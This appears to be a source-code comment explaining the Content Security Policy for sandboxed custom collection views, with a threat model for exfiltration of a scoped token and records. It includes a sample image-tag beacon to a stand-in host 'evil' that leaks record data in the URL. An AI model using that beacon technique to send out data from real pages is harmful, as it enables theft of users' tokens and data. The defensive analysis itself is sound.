/**
 * CSP for a custom collection view (see plans/done/feat-collections-custom-views.md).
 * Same policy as the preview header EXCEPT `connect-src` is the server origin
 * (not `'none'`): a custom view legitimately `fetch()`es its collection's data
 * endpoint.
 *
 * Threat model — a custom view is handed a scoped token (`window.__MC_VIEW`) +
 * the collection's records, so we must prevent exfiltration to an attacker:
 *   - **`connect-src` = the server origin only.** This is the channel that
 *     matters: fetch / XHR / WebSocket / sendBeacon / EventSource to an
 *     arbitrary host is what lets a malicious view stream the token/data out.
 *     Locked to the origin, the view can reach ONLY its own data endpoint.
 *   - **Script / style / font loads reuse the curated CDN allowlist.** A
 *     `<… src="https://cdn/x?token">` request does reach that host, but the
 *     allowlist is reputable infrastructure (jsdelivr / unpkg / cdnjs / Google
 *     Fonts / plotly) that does NOT expose per-request logs to third parties,
 *     so the token lands in the CDN's logs, never an attacker's. The
 *     allowlist-exfil bypass needs an attacker-CONTROLLABLE allowed host (open
 *     redirect, logging endpoint, attacker subdomain); none here qualify. This
 *     also lets views use charting libs (Chart.js, Plotly, D3) from a CDN.
 *   - **`img-src` additionally allows any `https:` host.** Feed/collection
 *     records routinely carry external image URLs (e.g. an RSS feed's article
 *     thumbnails), and a view must be able to render them. This re-admits a
 *     limited, ONE-WAY exfiltration channel — a compromised view could encode
 *     record data into an `<img src="https://evil/?leak=…">` URL — which the
 *     `connect-src` lock alone does not close. We accept it: the views are
 *     authored by the user's own agent over the user's own data, the channel is
 *     GET-only and URL-length-bounded (no response is readable), and `fetch` /
 *     XHR / WebSocket / beacon stay origin-locked, so bulk/bidirectional exfil
 *     is still blocked. If you need the strict guarantee back, proxy images
 *     through the origin instead of widening `img-src`.
 *   - **`media-src` likewise allows the origin + any `https:` host** (+ `data:`/
 *     `blob:`), so a record's audio/video URL — e.g. a podcast feed's `.mp3` —
 *     plays in an `<audio>`/`<video>` element. Same one-way GET-exfil tradeoff
 *     as `img-src`, accepted for the same reasons; the streamed bytes flow into
 *     the element, not into readable script state.
 *
 * `origin` MUST be the explicit server origin: the sandboxed iframe has an
 * opaque origin, so `'self'` would never match (same reason the preview policy
 * substitutes the origin into `img-src`).
